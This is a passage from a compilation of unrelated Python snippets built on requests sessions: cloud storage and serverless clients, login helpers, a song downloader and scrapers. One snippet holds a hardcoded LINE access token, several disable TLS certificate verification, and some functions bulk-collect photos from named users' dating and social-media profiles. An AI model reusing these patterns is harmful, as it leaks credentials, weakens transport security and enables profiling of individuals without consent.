        Lists the objects in a bucket. Throws StorageNoSuchKeyError if the given bucket does not exist.
        :param key: key of the object
        :return: Data of the object
        :rtype: str/bytes
        """
        if prefix:
            url = '/'.join([self.endpoint, container_name, '?format=json&prefix='+prefix])
        else:
            url = '/'.join([self.endpoint, container_name, '?format=json'])
        try:
            res = self.session.get(url)
            objects = res.json()

            # TODO: Adapt to Key and Size
            return objects
        except Exception as e:
            raise e 
**************************************
def download_song(song_info, session, mp3_option, download_folder, min_size):
    if(song_info['data']):
        if not mp3_option and song_info['size'] < min_size:
            logger.info("%s-%s 文件大小小于 10MB, 放弃下载。" %
                        (song_info['songname'], song_info['artist']))
            return None
        else:
            filename = "{0}-{1}.flac".format(
                validate_file_name(song_info['songname']),
                validate_file_name(song_info['artist']))

            filepath = os.path.join(download_folder, filename)
            logger.info("下载中: %s" % filepath)
            try:
                r = session.get(song_info['link'], headers=HEADERS, timeout=3)
                with open(filepath, 'wb') as f:
                    for chunk in r.iter_content(chunk_size=1024):
                        if chunk:
                            f.write(chunk)
                logger.info("下载完成: %s " % filepath)
            except requests.exceptions.Timeout as err:
                logger.error("%s during download filepath" % err) 
**************************************
def dynamic_global_properties(self):
        """Returns the globals used in the game.

        Example result:
            ```
            {
                'daily_percent': 3,
                'heist_percent': 3,
                'last_prod_update': '2019-03-04T12:55:44.001Z',
                 'drug_production_rate': 3671.530999999977,
                 'heist_pool': 82403306,
                 'balance': '66403.257 STEEM',
                 'steemprice': 0.3730699512
            }
            ```

        :return (dict): Game data
        """
        return self.session.get(
            self.base_url
        ).json() 
**************************************
def login(self):
        data = "password=%s&username=%s" % (self.password, self.username)
        res = self.session.post(self.endpoints['login'], data=data)
        res = res.json()
        self.auth_token = res['token']
        self.headers['Authorization'] = 'Token '+self.auth_token 
**************************************
def investment_profile(self):
        self.session.get(self.endpoints['investment_profile']) 
**************************************
def instruments(self, stock=None):
        res = self.session.get(self.endpoints['instruments'], params={'query':stock.upper()})
        res = res.json()
        return res['results'] 
**************************************
def quote_data(self, stock):
        params = { 'symbols': stock }
        res = self.session.get(self.endpoints['quotes'], params=params)
        res = res.json()
        return res['results'][0] 
**************************************
def WriteDB(information):
    for data in information:
        insert_data = GooglePlay(
            App=data['app'],
            Link=data['link'],
            Autor=data['autor'],
            Rate=data['rate'],
            Download=data['download'],
            Publish=datetime.datetime.strptime(data['publish'], "%Y年%m月%d日").date(),
            Item=data['item'],
        )
        db.session.add(insert_data)
    db.session.commit() 
**************************************
def get_yzmjpg(url):
    data={
        'login_site': 'E',
        'module': 'login',
        'rand': 'sjrand',
    }
    res=session.get(url,params=data)
    with open('yzm.jpg','wb') as f:
        f.write(res.content) 
**************************************
def check_jpg(url):
    answer=get_point(input('请输入验证码位置'))
    data={
        'answer': answer,
        'rand': 'sjrand',
        'login_site': 'E',
    }
    res=session.get(url,params=data)
    print(res.content.decode()) 
**************************************
def __init__(self):
    self.Talk = Talk()
    self._session = requests.session()
    self._headers = {'X-Line-Application': 'IOSIPAD\t7.14.0\tiPhone OS\t10.12.0', 'X-Line-Access': 'Emp1jl3qOjxCjXEhmaN5.QdLXoVPaKOU6WpvD80Sijq.NcwnmLOaI/dIyi3Y84WTCOxbNTN27m3ODDpkMLDPY64=', 'User-Agent': 'Line/7.14.0'} 
**************************************
def __init__(self, proxies=None):
        self.session = requests.session()
        if proxies is not None:
            self.session.proxies = proxies
        self.session.headers.update(UA) 
**************************************
def get(self, url, **kwargs):
        """
        :rtype: requests.Response
        """
        if 'timeout' in kwargs:
            kwargs.pop('timeout')
        return self.session.get(url, timeout=(2, 30), **kwargs) 
**************************************
def __init__(self, okta_org: str, usr: str, pw: str, app_url: str, mfa_choice: str):
        self.okta: OktaEndpoints = OktaEndpoints(okta_org, app_url)
        self.usr = usr
        self.pw = pw
        self.mfa_choice = mfa_choice
        self.interactive: bool = True
        self.session: requests.Session = requests.session()
        self.session.headers['Accept'] = 'application/json'
        self.session.headers['Content-Type'] = 'application/json' 
**************************************
def _authenticate_primary(self):
        self._get_credentials()
        data = {
            "username": self.usr,
            "password": self.pw,
            "options": {
                "multiOptionalFactorEnroll": True,
                "warnBeforePasswordExpired": True,
            }
        }
        resp = self.session.post(url=self.okta.authn, json=data)
        if resp.status_code == requests.codes.ok:
            return resp
        else:
            resp.raise_for_status() 
**************************************
def _initiate_mfa(self, factor, state_token):
        data = {
            'stateToken': state_token
        }
        return self.session.post(
            url=factor['_links']['verify']['href'],
            json=data
        ) 
**************************************
def _get_token(self, data):
        if data.get('status') not in HANDLED_STATUS:
            raise Exception("Something went wrong.\n"
                            "Don't know how to handle status '{}'".format(data.get('status')))
        if data['status'] != 'SUCCESS':
            data = self._verify_via_mfa(data)
        token = data.get('sessionToken')
        if not token:
            raise Exception('No session token found in response: \n{}'.format(data))
        return token 
**************************************
def get_cookies(self):
        base_url = 'https://yz.chsi.com.cn/apply/cjcx'
        session = requests.session()
        base_resp = session.get(base_url, headers=self.headers)
        self.cookies = base_resp.cookies 
**************************************
def main():
    start = time.time()

    if not os.path.exists(DOWNLOAD_DIR):
        os.mkdir(DOWNLOAD_DIR)

    url, mp3_option = get_args()
    if mp3_option:
        logger.info("将下载所有歌曲, 包括 MP3 格式.")
    song_list_name, song_list = fetch_song_list(url)
    logger.info("歌单中包含的歌曲有: %s" % song_list)
        
    download_folder = os.path.join(DOWNLOAD_DIR, validate_file_name(song_list_name))
    if not os.path.exists(download_folder):
        os.mkdir(download_folder)

    with ThreadPoolExecutor(max_workers=10) as executor:
        song_ids = executor.map(get_songid, song_list)
        song_infos = executor.map(get_song_info, song_ids)
        logger.info("获取歌曲信息完成，开始下载。")
        session = requests.session()
        download = partial(download_song, session=session, mp3_option=mp3_option,
                           download_folder=download_folder)
        executor.map(download, song_infos)

    end = time.time()
    logger.info("共耗时 %s s", str(end - start))


# 禁止 requests 模组使用系统代理 
**************************************
def __init__(self, game):
        if game not in self.games:
            raise NotImplementedError(""""parser for game "{}" doesn't exist""".format(game))
        if game == 'all':
            game = ''
        self.game_url = self.url_base + game
        self.session = requests.session() 
**************************************
def download_matches(self, crawl_stream: bool = True) -> List[Match]:
        """
        Downloads live and upcoming matches.
        :return: list of Match objects
        """
        resp = self.session.get(self.game_url)
        if resp.status_code != 200:
            raise ConnectionRefusedError('Got response error {}'.format(resp.status_code))
        sel = Selector(text=resp.text)
        matches = list(self.find_matches(sel))
        if crawl_stream:
            matches = self.update_match_streams(matches)
        return matches 
**************************************
def download_history(self, crawl_stream: bool = True) -> List[Match]:
        """
        Downloads recent matches.
        :return: list of Match objects
        """
        resp = self.session.get('{}/gosubet'.format(self.game_url))
        if resp.status_code != 200:
            raise ConnectionRefusedError('Got response error {}'.format(resp.status_code))
        sel = Selector(text=resp.text)
        matches = list(self.find_history(sel))
        if crawl_stream:
            matches = self.update_match_streams(matches)
        return matches 
**************************************
def update_match_streams(self, matches: List[Match]) -> List[Match]:
        """Populate Match objects with stream urls"""
        updated = []
        for item in matches:
            # Populate stream data if match is live
            if not item['time_secs']:
                resp = self.session.get(item['url'])
                sel_detailed = Selector(text=resp.text)
                item['stream'] = sel_detailed.xpath("//div[@class='matches-streams']"
                                                    "/span[.//a[re:test(text(),'english', 'i')]]"
                                                    "//iframe/@src").extract_first()
                item['stream'] = clean_stream_url(item['stream'])
            updated.append(item)
        return updated 
**************************************
def _create_or_load_session(self):
        session = requests.Session()
        cookies = self._load_cookies_from_file()
        _LOGGER.debug('Found cookies %s', cookies)
        if cookies is not None:
            session.cookies = cookies
        return session 
**************************************
def _clear_session(self):
        self._clear_cookie()
        self._clear_serial_number()
        self._session.close()
        self._session = requests.session()
        FileUtils.delete_dir(self._file_path) 
**************************************
def get_first_page(tag):
    # step 1, 访问网站,有新asp cookie的header
    new_header = build_valid_header()
    # step 2, login, 不确定是不是必须的步骤
    session.get(constants.login_uri, headers=new_header)
    # step 3, 使用分类tag初始化后端
    session.get(constants.search_handler_uri, params=build_search_handler_query(tag), headers=new_header)
    # step 4, 获取分组id,即ctl的html
    group_response = session.get(constants.group_uri, params=build_group_query(), headers=new_header)
    # step 5, get ctl
    ctl = find_doctor_ctl(group_response.text)
    # step 6 获取第一页,主要目的是queryId和总条数
    res = session.get(constants.ith_page_uri, params=build_first_page_query(ctl), headers=new_header)
    page_html = res.text
    return ctl, new_header, page_html 
**************************************
def build_paper_url(parent_tag_tag_tuple):
    """

    :param parent_tag_tag_tuple: tuple
    :return: PaperURL Object or None
    """
    parent_tag, tag = parent_tag_tag_tuple

    result = cnki_class.PaperURL([], tag, parent_tag)

    ctl, new_header, first_page_html = get_first_page(tag)
    item_num = find_item_num(first_page_html)
    page_num = calculate_page_num(item_num)

    if page_num == 1:
        paper_list = parse_url_list(first_page_html)
        result.urls = paper_list
    else:
        query_id = parse_query_id(first_page_html)
        for index in range(page_num):
            current_page = index + 1
            ith_page = session.get(constants.ith_page_uri,
                                   params=build_ith_page_query(ctl, current_page, query_id),
                                   headers=new_header).text
            if is_check_code_page(ith_page):
                ctl, new_header, first_page_html = get_first_page(tag)
                ith_page = session.get(constants.ith_page_uri,
                                       params=build_ith_page_query(ctl, current_page, query_id),
                                       headers=new_header).text
            paper_list = parse_url_list(ith_page)
            result.urls += paper_list
    if len(result.urls) == 0:
        return None
    collection_utils.unique(result.urls, lambda x, y: cmp(x, y))
    result.urls = [uri.replace('kns', 'KCMS') for uri in result.urls]
    return result


############### build paper url end ###############
############### other process ############### 
**************************************
def login(username, password):
    '''
    Function to log into user's google account.
    '''
    # prepare requests session object. It will be used in all the consequent requests.
    session = requests.session()

    # TODO: Don;t hard code, see https://github.com/HashGrowth/py-google-auth/issues/2 for details.
    # url to finally redirect to.
    play_console_base_url = "https://play.google.com/apps/publish"

    # login normally
    response, error, session = normal_login(session, username, password, play_console_base_url)

    return response, error, session 
**************************************
def serialize_session(session):
    '''
    Takes a session object and serializes its attribute dictionary.
    '''

    session_dict = session.__dict__
    encoded = jsonpickle.encode(session_dict)
    return encoded 
**************************************
def deserialize_session(session):
    '''
    Takes a dictionary having a session object's atributes and deserializes it into a sessoin
    object.
    '''

    decoded = jsonpickle.decode(session)
    new_session = requests.session()
    new_session.__dict__.update(decoded)
    return new_session 
**************************************
def clean_session(session):
    '''
    We embedded some extra variables while sending session to network,
    These are not part of requests session, so we need to remove them.
    This method removes those extra attributes.
    '''

    attrs = ['next_url', 'q_params', 'select_method_url', 'prev_payload']
    for attr in attrs:
        if attr in session.__dict__:
            session.__delattr__(attr)

    return session 
**************************************
def handle_default_method(default_method, response, session):
    '''
    This function is used when the default method is not available.
    '''
    response_data = {}

    # create payload from response text
    payload = make_payload(response.text)

    # current response url is used to make next POST call for second step of login and
    # payload contains parameters that are to be sent with POST request, since we need
    # these in the function that is called on step two end point, we save it in the
    # session object and send in response so that we get it back with next request.

    session.next_url = response.url
    session.prev_payload = payload

    # Google prompt need two variables from the response page which are used to make
    # POST request to an api where prompt's respose is recorded to know what user has
    # responded for prompt. saving them into query_params.
    if default_method == 1:
        query_params = get_query_params(response.text)
        session.query_params = query_params

    # if default method is text message, get the phone number to which otp was sent.
    if default_method == 3:
        phone_num = get_phone_number(response.text)
        response_data['number'] = phone_num

    response_data['default_method'] = default_method

    return response_data, session 
**************************************
def __init__(self):
        self.GOOGLE_IMAGE_SEARCH_URL = "https://www.google.co.jp/search"
        self.session = requests.session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) \
                    Gecko/20100101 Firefox/10.0"
            }
        ) 
**************************************
def __init__(self, endpoint, namespace, api_key=None, auth=None, insecure=False, user_agent=None):
        """
        OpenWhiskClient Constructor

        :param endpoint: OpenWhisk endpoint.
        :param namespace: User namespace.
        :param api_key: User AUTH Key.  HTTP Basic authentication.
        :param auth: Authorization token string "Basic eyJraWQiOiIyMDE5MDcyNCIsImFsZ...".
        :param insecure: Insecure backend. Disable cert verification.
        :param user_agent: User agent on requests.
        """
        self.endpoint = endpoint.replace('http:', 'https:')
        self.namespace = namespace
        self.api_key = api_key
        self.auth = auth

        if self.api_key:
            api_key = str.encode(self.api_key)
            auth_token = base64.encodebytes(api_key).replace(b'\n', b'')
            self.auth = 'Basic %s' % auth_token.decode('UTF-8')

        self.session = requests.session()

        if insecure:
            self.session.verify = False

        self.headers = {
            'content-type': 'application/json',
            'Authorization': self.auth,
        }

        if user_agent:
            default_user_agent = self.session.headers['User-Agent']
            self.headers['User-Agent'] = default_user_agent + ' {}'.format(user_agent)

        self.session.headers.update(self.headers)
        adapter = requests.adapters.HTTPAdapter()
        self.session.mount('https://', adapter) 
**************************************
def create_action(self, package, action_name, image_name, code=None, memory=None,
                      timeout=30000, kind='blackbox', is_binary=True, overwrite=True):
        """
        Create an IBM Cloud Functions action
        """
        data = {}
        limits = {}
        cfexec = {}
        limits['memory'] = memory
        limits['timeout'] = timeout
        data['limits'] = limits

        cfexec['kind'] = kind
        if kind == 'blackbox':
            cfexec['image'] = image_name
        cfexec['binary'] = is_binary
        cfexec['code'] = base64.b64encode(code).decode("utf-8") if is_binary else code
        data['exec'] = cfexec

        logger.debug('I am about to create a new cloud function action: {}'.format(action_name))
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'actions', package,
                        action_name + "?overwrite=" + str(overwrite)])

        res = self.session.put(url, json=data)
        resp_text = res.json()

        if res.status_code == 200:
            logger.debug("OK --> Created action {}".format(action_name))
        else:
            msg = 'An error occurred creating/updating action {}: {}'.format(action_name, resp_text['error'])
            raise Exception(msg) 
**************************************
def get_action(self, package, action_name):
        """
        Get an IBM Cloud Functions action
        """
        logger.debug("I am about to get a cloud function action: {}".format(action_name))
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'actions', package, action_name])
        res = self.session.get(url)
        return res.json() 
**************************************
def list_actions(self, package):
        """
        List all IBM Cloud Functions actions in a package
        """
        logger.debug("I am about to list all actions from: {}".format(package))
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'actions', package, ''])
        res = self.session.get(url)
        if res.status_code == 200:
            return res.json()
        else:
            return [] 
**************************************
def delete_action(self, package, action_name):
        """
        Delete an IBM Cloud Function
        """
        logger.debug("Delete cloud function action: {}".format(action_name))
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'actions', package, action_name])
        res = self.session.delete(url)
        resp_text = res.json()

        if res.status_code != 200:
            logger.debug('An error occurred deleting action {}: {}'.format(action_name, resp_text['error'])) 
**************************************
def list_packages(self):
        """
        List all IBM Cloud Functions packages
        """
        logger.debug('I am about to list all the IBM CF packages')
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'packages'])

        res = self.session.get(url)

        if res.status_code == 200:
            return res.json()
        else:
            logger.debug("Unable to list packages")
            raise Exception("Unable to list packages") 
**************************************
def delete_package(self, package):
        """
        Delete an IBM Cloud Functions package
        """
        logger.debug("I am about to delete the package: {}".format(package))
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'packages', package])
        res = self.session.delete(url)
        resp_text = res.json()

        if res.status_code == 200:
            return resp_text
        else:
            logger.debug('An error occurred deleting the package {}: {}'.format(package, resp_text['error'])) 
**************************************
def create_package(self, package):
        """
        Create an IBM Cloud Functions package
        """
        logger.debug('I am about to create the package {}'.format(package))
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'packages', package + "?overwrite=False"])

        data = {"name": package}
        res = self.session.put(url, json=data)
        resp_text = res.json()

        if res.status_code != 200:
            logger.debug('Package {}: {}'.format(package, resp_text['error']))
        else:
            logger.debug("OK --> Created package {}".format(package)) 
**************************************
def invoke(self, package, action_name, payload={}, is_ow_action=False, self_invoked=False):
        """
        Invoke an IBM Cloud Function by using new request.
        """
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'actions', package, action_name])
        parsed_url = urlparse(url)

        try:
            if is_ow_action:
                resp = self.session.post(url, json=payload, verify=False)
                resp_status = resp.status_code
                data = resp.json()
            else:
                ctx = ssl._create_unverified_context()
                conn = http.client.HTTPSConnection(parsed_url.netloc, context=ctx)
                conn.request("POST", parsed_url.geturl(),
                             body=json.dumps(payload),
                             headers=self.headers)
                resp = conn.getresponse()
                resp_status = resp.status
                data = json.loads(resp.read().decode("utf-8"))
                conn.close()
        except Exception as e:
            if not is_ow_action:
                conn.close()
            if self_invoked:
                return None
            return self.invoke(package, action_name, payload, is_ow_action=is_ow_action, self_invoked=True)

        if resp_status == 202 and 'activationId' in data:
            return data["activationId"]
        elif resp_status == 429:
            return None  # "Too many concurrent requests in flight"
        else:
            logger.debug(data)
            if resp_status == 401:
                raise Exception('Unauthorized - Invalid API Key')
            elif resp_status == 404:
                raise Exception('Runtime: {} not deployed'.format(action_name))
            else:
                raise Exception(data['error']) 
**************************************
def invoke_with_result(self, package, action_name, payload={}):
        """
        Invoke an IBM Cloud Function waiting for the result.
        """
        url = '/'.join([self.endpoint, 'api', 'v1', 'namespaces', self.namespace, 'actions',
                        package, action_name + "?blocking=true&result=true"])
        resp = self.session.post(url, json=payload)
        result = resp.json()

        return result 
**************************************
def get_object(self, container_name, key, stream=False, extra_get_args={}):
        """
        Get object from Swift with a key. Throws StorageNoSuchKeyError if the given key does not exist.
        :param key: key of the object
        :return: Data of the object
        :rtype: str/bytes
        """
        if not container_name:
            container_name = self.storage_container
        url = '/'.join([self.endpoint, container_name, key])
        headers = {'X-Auth-Token': self.token}
        headers.update(extra_get_args)
        try:
            res = self.session.get(url, headers=headers, stream=stream)
            if res.status_code == 200 or res.status_code == 206:
                if stream:
                    data = res.raw
                else:
                    data = res.content
                return data
            elif res.status_code == 404:
                raise StorageNoSuchKeyError(container_name, key)
            else:
                raise Exception('{} - {}'.format(res.status_code, key))
        except StorageNoSuchKeyError:
            raise StorageNoSuchKeyError(container_name, key)
        except Exception as e:
            print(e)
            raise StorageNoSuchKeyError(container_name, key) 
**************************************
def delete_object(self, container_name, key):
        """
        Delete an object from Swift.
        :param bucket: bucket name
        :param key: data key
        """
        url = '/'.join([self.endpoint, container_name, key])
        return self.session.delete(url) 
**************************************
def __init__(self, *args, **kwargs):
        super(HTTPClient, self).__init__(*args, **kwargs)
        self.session = requests.session() 
**************************************
def get(self, callback, path, params=None):
        uri = self.uri(path, params)
        return callback(self.response(
            self.session.get(uri, verify=self.verify, cert=self.cert))) 
**************************************
def put(self, callback, path, params=None, data=''):
        uri = self.uri(path, params)
        return callback(self.response(
            self.session.put(uri, data=data, verify=self.verify,
                             cert=self.cert))) 
**************************************
def delete(self, callback, path, params=None, data=''):
        uri = self.uri(path, params)
        return callback(self.response(
            self.session.delete(uri, data=data, verify=self.verify,
                                cert=self.cert))) 
**************************************
def post(self, callback, path, params=None, data=''):
        uri = self.uri(path, params)
        return callback(self.response(
            self.session.post(uri, data=data, verify=self.verify,
                              cert=self.cert))) 
**************************************
def main():
    start = time.time()

    url, mp3_option, output, worker, min_size = get_args()
    if url is None:
        logger.info("未设置 url 信息.")
        return 1
    if mp3_option:
        logger.info("将下载所有歌曲, 包括 MP3 格式.")
    if not os.path.exists(output):
        os.mkdir(output)

    song_list_name, song_list = fetch_song_list(url)
    logger.info("歌单中包含的歌曲有: \n================== \
                %s ==================" % song_list)

    download_folder = os.path.join(output,
                                   validate_file_name(song_list_name))
    if not os.path.exists(download_folder):
        os.mkdir(download_folder)

    with ThreadPoolExecutor(max_workers=worker) as executor:
        song_ids = executor.map(get_songid, song_list)
        song_infos = executor.map(get_song_info, song_ids)
        logger.info("获取歌曲信息完成，开始下载。")
        session = requests.session()
        download = partial(download_song, session=session,
                           mp3_option=mp3_option,
                           download_folder=download_folder,
                           min_size=min_size)
        executor.map(download, song_infos)

    end = time.time()
    logger.info("共耗时 %s s", str(end - start))


# 禁止 requests 模组使用系统代理 
**************************************
def scrape_twitter(username):
    #start a new web-browsing session
    s = requests.session()

    #make containers for all the links to be collected
    messy_links, clean_links = [],[]

    #using the user's username, download the file containing the links to the last 3200 pictures ever posted
    user_links_page = s.get('https://twitter.com/i/profiles/show/'+username+'/media_timeline.json?count=3200')
    user_links_page = user_links_page.text.split('"')

    #collect the url of every possible jpg picture, find the uncompressed url
    for link in user_links_page:
        link = ''.join(link.split('\\'))
        if link.endswith('.jpg'):
            if link.startswith('https://pbs.twimg.com/media/') or \
               link.startswith('https://pbs.twimg.com/tweet_video_thumb/') or \
               link.startswith('https://pbs.twimg.com/ext_tw_video_thumb/'):
                messy_links.append(link + ':orig')

    #make sure there are no duplicate links
    for link in messy_links:
        if link not in clean_links:
            clean_links.append(link)

    #check if the account has any pictures associated with it
    if len(clean_links) > 0:

        #profile picture is compressed regardless, remove it
        if 'profile_images' in clean_links[0]:
            clean_links.pop(0)

    #terminate the browsing session
    s.close()

    #return all the decompressed image links
    return clean_links 
**************************************
def scrape_tinder(username):
    #start a new web-browsing session
    s = requests.session()

    #make containers for all the links to be collected
    messy_links, clean_links = [],[]

    #download the user's profile page
    profile_page = s.get('https://www.gotinder.com/@'+username)

    #check if account exists
    if "<h1 id='title'>Looking for Someone?</h1>" not in profile_page:

        #convert the profile page to a list
        profile_page = profile_page.text.split('"')

        #collect the url of every possible jpg picture
        for link in profile_page:
            if '.jpg' in link:
                messy_links.append(link)

        #find the uncompressed links to the images provided, and clean them up
        for link in messy_links:
            clean_link = '/'.join(link.split('&#x2F;'))
            if clean_link not in clean_links:
                clean_links.append(clean_link)

        #check if the account has any pictures associated with it
        if len(clean_links) > 0:

            #remove the picture that's not user related
            clean_links.pop(1)

    #terminate the browsing session
    s.close()

    #return all the decompressed image links
    return clean_links 
**************************************
def scrape_okcupid(username):
    #start a new web-browsing session
    s = requests.session()

    #make containers for all the links to be collected
    messy_links, clean_links = [],[]

    #download the user's profile page
    profile_page = s.get('https://www.okcupid.com/profile/'+username).text.encode('utf-8')
    profile_page = str(str(profile_page).split("'")).split('"')

    #check if account exists
    if '<title>Account not found | OkCupid</title>' not in str(profile_page):
        
        #collect the url of every possible jpg picture
        for link in profile_page:
            if ('.jpeg' in link) and ('/images/' in link):
                messy_links.append(link)

        #choose the first cdn server available to prevent duplicate images
        chosen_cdn_server = messy_links[0][:messy_links[0].index('/images')]

        #find the uncompressed links to the images provided, and clean them up
        for link in messy_links:
            clean_link = chosen_cdn_server+'/images/'+link[::-1][:link[::-1].index('/')][::-1]
            clean_link = clean_link[::-1][clean_link[::-1].index(".")+1:][::-1]+'.jpeg'
            if clean_link not in clean_links:
                clean_links.append(clean_link)

    #terminate the browsing session
    s.close()

    #return all the decompressed image links
    return clean_links 
**************************************
def scrape_okcupid(username):
	#start a new web-browsing session
	s = requests.session()

	#make containers for all the links to be collected
	messy_links, clean_links = [],[]

	#download the user's profile page
	profile_page = s.get('https://www.okcupid.com/profile/'+username).text.encode('utf-8')
	profile_page = str(str(profile_page).split("'")).split('"')

	#check if account exists
	if '<title>Account not found | OkCupid</title>' not in str(profile_page):
		
		#collect the url of every possible jpg picture
		for link in profile_page:
			if ('.jpeg' in link) and ('/images/' in link):
				messy_links.append(link)

		#choose the first cdn server available to prevent duplicate images
		chosen_cdn_server = messy_links[0][:messy_links[0].index('/images')]

		#find the uncompressed links to the images provided, and clean them up
		for link in messy_links:
			clean_link = chosen_cdn_server+'/images/'+link[::-1][:link[::-1].index('/')][::-1]
			clean_link = clean_link[::-1][clean_link[::-1].index('.')+1:][::-1]+'.jpeg'
			if clean_link not in clean_links:
				clean_links.append(clean_link)

	#terminate the browsing session
	s.close()

	#return all the decompressed image links
	return clean_links 
**************************************
def scrape_twitter(username):
    #start a new web-browsing session
    s = requests.session()

    #make containers for all the links to be collected
    messy_links, clean_links = [],[]

    #using the user's username, download the file containing the links to the last 3200 pictures ever posted
    user_links_page = s.get('https://twitter.com/i/profiles/show/'+username+'/media_timeline.json?count=3200')
    user_links_page = user_links_page.text.split('"')

    #collect the url of every possible jpg picture, find the uncompressed url
    for link in user_links_page:
        link = ''.join(link.split('\\'))
        if link.endswith('.jpg'):
            if link.startswith('https://pbs.twimg.com/media/') or \
               link.startswith('https://pbs.twimg.com/tweet_video_thumb/') or \
               link.startswith('https://pbs.twimg.com/ext_tw_video_thumb/'):
                messy_links.append(link + ':orig')

    #make sure there are no duplicate links
    for link in messy_links:
        if link not in clean_links:
            clean_links.append(link)

    #check if the account has any pictures associated with it
    if len(clean_links) > 0:

        #profile picture is compressed regardless, remove it
        if 'profile_images' in clean_links[0]:
            clean_links.pop(0)

    #terminate the browsing session
    s.close()

    #return all the decompressed image links
    return clean_links 
**************************************
def __init__(self, method, url, **kwargs):
        if kwargs:
            msg = "A call using the {method} method was requested to {url} on a FortiOS instance that had no " \
                  "valid session or was not connected. Parameters were:\n{params}". \
                format(method=method, url=url, params=kwargs)
        else:
            msg = "A call using the {method} method was requested to {url} on a FortiOS instance that had no " \
                  "valid session or was not connected.". \
                format(method=method, url=url)
        super(FGTValidSessionException, self).__init__(msg) 
**************************************
def fgt_session(self):
        if self._session is None:
            with requests.session() as sess:
                self._session = sess
        return self._session 
**************************************
def __init__(self, base_url=None):
        self.base_url = base_url or BASE_API_URL
        self.session = requests.session() 
**************************************
def fights(self, player):
        """Recent fights of the player.

        :param player: Player
        :return (list): A list of dictionaries including fight history.
        """
        return self.session.get(
            self.get_absolute_url(f'fights/{player}')
        ).json() 
**************************************
def info(self, player):
        """User's game data. Buildings, resources, unit, etc...

        :param player: Player
        :return:  A list of dictionaries including fight history.
        """
        return self.session.get(
            self.get_absolute_url(f'user/{player}')
        ).json() 
**************************************
def users(self, max_production_rate=420):
        """Get a list of players by maximum production rate.

        It's possible for the do pagination by using that parameter.

        :param max_production_rate: Maximum production rate.
        :return (list): A list of dictionaries including user data.
        """
        return self.session.get(
            self.get_absolute_url(f'users/{max_production_rate}')
        ).json() 
**************************************
def getAppInformation(app):
    all_information = []
    for index, item in enumerate(app, 1):
        rs = requests.session()
        res = rs.get(item['link'], verify=False)
        soup = BeautifulSoup(res.text, 'html.parser')
        for data in soup.select('.main-content'):
            ## rate
            try:
                rate = data.select('.score')[0].text
            except:
                rate = 0
            ## datePublished, numDownloads
            datePublished, numDownloads = "", ""
            for tag in data.select('.details-section-contents .meta-info .content'):
                try:
                    if (tag.attrs['itemprop'] == 'datePublished'):
                        datePublished = tag.text
                    if (tag.attrs['itemprop'] == 'numDownloads'):
                        numDownloads = tag.text
                    if (datePublished != "" and numDownloads != ""):
                        break
                except:
                    pass
            try:
                if (numDownloads == ""):
                    numDownloads = 0
                app_data = {
                    "app": data.select('.id-app-title')[0].text,
                    "link": item['link'],
                    "autor": data.select('.document-subtitle.primary')[0].text,
                    "rate": rate,
                    "download": numDownloads,
                    "publish": datePublished,
                    "item": item['itemhead']
                }
            except:
                print('There is a problem with the URL {}'.format(item['link']))
                break

            all_information.append(app_data)
        print('{} %'.format(round(100 * index / len(app), 2)))
    return all_information 
**************************************
def scrape_instagram(username):
    #start a new web-browsing session
    s = requests.session()

    #make containers for all the links to be collected
    messy_links, clean_links = [],[]

    #download the user's profile page
    profile_page = s.get('http://instagram.com/'+username).text

    #check if account exists
    if '<body class=" p-error dialog-404">' not in profile_page:

        #test if the user's account is private
        if '"is_private": true' in profile_page:
            user_links_page = profile_page.split('"')

        #otherwise, get all the other images
        else:
            profile_page = profile_page.split('"owner": {"id": "')

            #get the user's unique user id from the profile page
            unique_user_id = profile_page[1][:profile_page[1].index('"')]

            #get the dynamically created javascript file's temporary unique pathway
            unique_commons_js = profile_page[len(profile_page)-1].split('en_US_Commons.js/')[1]
            unique_commons_js = unique_commons_js[:unique_commons_js.index('.js')]

            #download the dynamically generated javascript page to get the unique session id
            javascript_page = s.get('https://www.instagram.com/static/bundles/en_US_Commons.js/'+unique_commons_js+'.js')
            javascript_page = javascript_page.text.split('return e.profilePosts.byUserId.get(t).pagination},queryId:"')[1]

            #get the unique session id from the javascript page
            unique_session_id = javascript_page[:javascript_page.index('"')]

            #using the session and user id's, download the file containing the links to all pictures ever posted
            user_links_page = s.get('https://www.instagram.com/graphql/query/?query_id='+unique_session_id+'&id='+unique_user_id+'&first=1000000')
            user_links_page = user_links_page.text.split('"')

        #collect the url of every possible jpg picture
        for link in user_links_page:
            if '.jpg' in link:
                messy_links.append(link)

        #find the uncompressed links to the images provided, and clean them up
        for link in messy_links:
            segmented_link = link.split('/')
            unique_post_id = link[::-1][:link[::-1].index('/')][::-1]
            clean_link = 'https://'+segmented_link[2]+'/'+segmented_link[3]+'/'+unique_post_id
            if clean_link not in clean_links:
                clean_links.append(clean_link)

    #terminate the browsing session
    s.close()

    #return all the decompressed image links
    return clean_links 
**************************************
def scrape_vsco(username):
    #start a new web-browsing session
    s = requests.session()

    #make containers for all the links to be collected
    messy_links, clean_links = [],[]

    #download the user's profile page
    profile_page = s.get('http://vsco.co/'+username)

    #check if account exists
    if '<p class="page-error-heading mt40">This page does not exist</p>' not in profile_page.text:

        #get the unique session id from the site's cookies
        unique_session_id = str(profile_page.cookies).split('vs=')[1]
        unique_session_id = unique_session_id[:unique_session_id.index(' ')]

        #convert the profile page to a string
        profile_page = profile_page.text

        #get the user's unique user id from the profile page
        unique_user_id = profile_page.split('"id":')[1]
        unique_user_id = unique_user_id[:unique_user_id.index(',')]

        #find the user's profile picture link
        profile_picture_link = profile_page.split('responsive_url":"')[1]
        profile_picture_link = profile_picture_link[:profile_picture_link.index('"')]
        
        #add the profile picture link to the list
        messy_links.append('http://'+profile_picture_link)

        #using the session and user id's, download the file containing the links to all pictures ever posted
        user_links_page = s.get('http://vsco.co/ajxp/'+unique_session_id+'/2.0/medias?site_id='+unique_user_id+'&page=1&size=10000').text.split('"')

        #collect the url of every possible jpg picture
        for link in user_links_page:
